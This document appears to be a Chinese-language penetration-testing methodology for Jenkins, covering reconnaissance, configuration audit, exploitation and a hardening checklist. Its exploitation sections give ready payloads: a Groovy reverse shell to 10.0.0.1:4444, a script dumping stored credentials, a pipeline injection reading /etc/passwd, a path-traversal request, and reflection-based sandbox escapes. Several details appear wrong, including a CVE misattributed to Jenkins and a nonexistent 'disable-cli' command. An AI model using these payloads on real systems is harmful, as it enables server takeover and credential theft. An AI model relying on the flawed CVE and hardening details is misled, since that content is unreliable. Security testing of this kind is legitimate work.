# Jenkins 安全测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供 Jenkins CI/CD 安全测试的系统化方法
- 指导测试人员识别 Jenkins 配置和使用中的安全漏洞
- 帮助理解 Jenkins 架构中的攻击面和防御措施

## 1.2 适用范围
- 适用于使用 Jenkins 进行 CI/CD 的环境
- 适用于 Jenkins 控制器 - 代理架构
- 适用于使用 Pipeline、Freestyle 等任务类型的场景

## 1.3 读者对象
- 渗透测试工程师
- Jenkins 管理员
- DevSecOps 工程师
- 安全审计人员

---

# 第二部分：核心渗透技术专题

## 专题一：Jenkins 安全测试

### 2.1 技术介绍

Jenkins 安全测试是指对 Jenkins 服务器的配置、权限管理、插件安全、Pipeline 脚本、凭证存储等进行系统性安全评估，识别可能导致远程代码执行、凭证泄露、权限提升的安全弱点。

**Jenkins 架构：**

```
┌─────────────────────────────────────────────────────────────┐
│                      Jenkins 架构                            │
├─────────────────────────────────────────────────────────────┤
│  Jenkins Controller (主节点)                                │
│  ├── Web UI (8080 端口)                                     │
│  ├── CLI (50000 端口)                                       │
│  ├── JNLP (50000 端口)                                      │
│  ├── 任务调度                                               │
│  └── 凭证存储                                               │
├─────────────────────────────────────────────────────────────┤
│  Jenkins Agents (代理节点)                                  │
│  ├── SSH Agents                                             │
│  ├── JNLP Agents                                            │
│  ├── Docker Agents                                          │
│  └── Kubernetes Agents                                      │
└─────────────────────────────────────────────────────────────┘
```

**常见安全问题：**

| 问题类型 | 描述 | 危害等级 |
|---------|------|---------|
| 未授权访问 | Jenkins 无认证或弱认证 | 严重 |
| 默认凭证 | 使用默认或弱密码 | 严重 |
| 脚本控制台 | Groovy 脚本执行 | 严重 |
| 凭证泄露 | 存储在 Jenkins 中的凭证 | 高 |
| 插件漏洞 | 存在漏洞的插件 | 高 |
| 代理逃逸 | Agent 突破沙箱限制 | 高 |
| Pipeline 注入 | 用户输入注入 Pipeline | 高 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 公开 Jenkins UI | 未设置认证的 Jenkins | 任何人都可以访问和执行任务 |
| 远程构建 | 触发远程构建 | 可能触发恶意构建 |
| CLI 访问 | Jenkins CLI 接口 | 可能执行任意命令 |
| 凭证使用 | Pipeline 使用凭证 | 凭证可能被窃取 |
| 脚本执行 | Script Console | 直接执行 Groovy 代码 |
| 插件管理 | 安装第三方插件 | 可能安装恶意插件 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别 Jenkins 服务**
```bash
# 扫描 Jenkins 端口
nmap -p 8080,8443,50000 target.com

# 检查 Jenkins 响应
curl -I http://target.com:8080
# X-Jenkins: 2.xxx

# 检查 API 访问
curl http://target.com:8080/api/json
curl http://target.com:8080/computer/api/json
```

**步骤二：检查认证配置**
```bash
# 测试未授权访问
curl http://target.com:8080/manage
curl http://target.com:8080/script

# 测试默认凭证
curl -u admin:admin http://target.com:8080/api/json
curl -u admin:password http://target.com:8080/api/json
curl -u root:root http://target.com:8080/api/json
```

**步骤三：检查插件版本**
```bash
# 获取插件列表
curl http://target.com:8080/pluginManager/api/json

# 检查存在漏洞的插件
# 对比 CVE 数据库
```

**步骤四：检查凭证存储**
```bash
# 检查凭证域
curl http://target.com:8080/credentials/store/

# 尝试访问系统凭证
# 如果有权限
```

#### 2.3.2 白盒测试

**步骤一：审计 Jenkins 配置**
```bash
# 检查主配置文件
cat ~/.jenkins/config.xml

# 检查安全配置
# <useSecurity>true</useSecurity>
# <authorizationStrategy>...</authorizationStrategy>

# 检查全局安全配置
# 是否启用 CSRF 保护
# 是否禁用 CLI
```

**步骤二：审计 Pipeline 脚本**
```groovy
// 检查 Jenkinsfile

// 风险点：
// 1. 用户输入直接执行
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh "npm install ${params.PACKAGE}"  // 注入风险
            }
        }
    }
}

// 2. 凭证使用
withCredentials([string(credentialsId: 'api-key', variable: 'API_KEY')]) {
    sh "echo $API_KEY"  // 可能泄露到日志
}

// 3. 脚本注入
sh """
    git checkout ${BRANCH_NAME}
    npm install
"""
```

**步骤三：检查代理配置**
```bash
# 检查代理连接方式
# SSH、JNLP、Docker 等

# 检查代理权限
# 代理是否有过多权限

# 检查代理隔离
# 不同任务的代理是否隔离
```

### 2.4 漏洞利用方法

#### 2.4.1 未授权访问利用

```bash
# 1. 访问 Script Console
# http://target.com:8080/script

# 2. 执行 Groovy 代码
# 反弹 Shell
def host="10.0.0.1"
def port=4444
def p=["/bin/sh", "-c", "/bin/bash -i >& /dev/tcp/$host/$port 0>&1"]
p.execute()

# 3. 窃取凭证
# 通过 Jenkins API 获取存储的凭证
```

#### 2.4.2 凭证窃取

```bash
# 使用 Jenkins CLI
java -jar jenkins-cli.jar -s http://target.com:8080 list-credentials

# 使用 Groovy 脚本
# 在 Script Console 执行
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.plugins.credentials.impl.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0].getStore()

for (c in store.getCredentials(domain)) {
    println c.id + ": " + c.username + ":" + c.password
}
```

#### 2.4.3 Pipeline 注入

```groovy
// 如果 Pipeline 使用用户输入
pipeline {
    agent any
    parameters {
        string(name: 'TARGET', defaultValue: 'prod')
    }
    stages {
        stage('Deploy') {
            steps {
                // 用户输入：prod; cat /etc/passwd #
                sh "deploy-to-${TARGET}"
            }
        }
    }
}

// 利用：TARGET=prod; cat /etc/passwd #
// 执行：deploy-to-prod; cat /etc/passwd #
```

#### 2.4.4 插件漏洞利用

```bash
# CVE-2019-7238 - Script Security Bypass
# 利用：在 Script Console 执行特定 Groovy 代码

# CVE-2020-2096 - XStream RCE
# 利用：通过 JNLP 协议发送恶意序列化数据

# CVE-2022-20610 - Path Traversal
# 利用：访问任意文件
curl http://target.com:8080/static/..%2F..%2F..%2Fetc%2Fpasswd
```

#### 2.4.5 代理逃逸

```bash
# 1. 如果 Agent 配置不当
# 可以从 Agent 访问 Controller

# 2. 利用 Agent 到 Controller 的连接
# 获取 Controller 上的凭证

# 3. 利用共享文件系统
# Agent 可能访问 Controller 文件
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过脚本沙箱

```groovy
// 1. 利用 @NonCPS 注解
@NonCPS
def bypassSandbox() {
    // 沙箱外执行
}

// 2. 利用方法引用
def method = "class".getMethod("forName", String.class)
def clazz = method.invoke(null, "java.lang.Runtime")

// 3. 利用反射
Class.forName("java.lang.Runtime").getRuntime().exec("id")
```

#### 2.5.2 绕过凭证保护

```groovy
// 1. 如果凭证绑定到变量
// 可能通过日志输出

withCredentials([string(credentialsId: 'secret', variable: 'SECRET')]) {
    sh "echo Secret is: $SECRET"  // 泄露
}

// 2. 通过文件读取
// 凭证可能存储在文件中
```

#### 2.5.3 绕过 CSRF 保护

```bash
# 1. 如果 CSRF 保护未启用
# 直接发送 POST 请求

# 2. 利用浏览器
# 诱导管理员访问恶意页面

# 3. 利用 API
# 某些 API 可能不受 CSRF 保护
```

---

# 第三部分：附录

## 3.1 Jenkins 安全配置检查表

| 检查项 | 推荐配置 | 风险等级 |
|-------|---------|---------|
| 认证启用 | 启用矩阵安全或基于角色的授权 | 严重 |
| 默认凭证 | 修改默认 admin 密码 | 严重 |
| CSRF 保护 | 启用 CSRF 保护 | 高 |
| CLI 访问 | 禁用 CLI over Remoting | 高 |
| 脚本沙箱 | 启用 Script Security 插件 | 高 |
| 插件更新 | 定期更新插件 | 中 |
| 代理隔离 | 使用标签隔离代理 | 中 |
| 审计日志 | 启用 Audit Trail 插件 | 中 |

## 3.2 Jenkins 加固命令

```bash
# 1. 启用安全
# 通过 UI: Manage Jenkins > Configure Global Security

# 2. 禁用 CLI
java -jar jenkins-cli.jar -s http://localhost:8080 disable-cli

# 3. 配置防火墙
# 只允许特定 IP 访问 8080 和 50000 端口

# 4. 启用 HTTPS
# 配置 SSL 证书
```

## 3.3 常见 Jenkins CVE

| CVE 编号 | 描述 | 影响版本 |
|---------|------|---------|
| CVE-2019-7238 | Script Security 绕过 | < 2.150.3 |
| CVE-2019-1003000 | RCE via Pipeline | < 2.176 |
| CVE-2020-2096 | XStream RCE | < 2.235 |
| CVE-2021-21600 | RCE via CLI | < 2.289 |
| CVE-2022-20610 | Path Traversal | < 2.331 |
| CVE-2023-27898 | RCE via Agent | < 2.387 |

## 3.4 安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| jenkins-cli | Jenkins CLI 工具 | 官方提供 |
| jenkins-linter | Pipeline 语法检查 | https://www.jenkins.io/doc/book/pipeline/development-guide/ |
| jenkins-security-scanner | Jenkins 安全扫描 | 社区工具 |
| trufflehog | 凭证扫描 | https://github.com/trufflesecurity/trufflehog |

---

## 参考资源

- [Jenkins Security Guidelines](https://www.jenkins.io/doc/book/security/)
- [Jenkins Hardening](https://www.jenkins.io/doc/book/security/hardening/)
- [OWASP Jenkins Security](https://owasp.org/www-project-devsecops-guideline/)
- [Jenkins CVE Database](https://www.jenkins.io/security/advisory/)
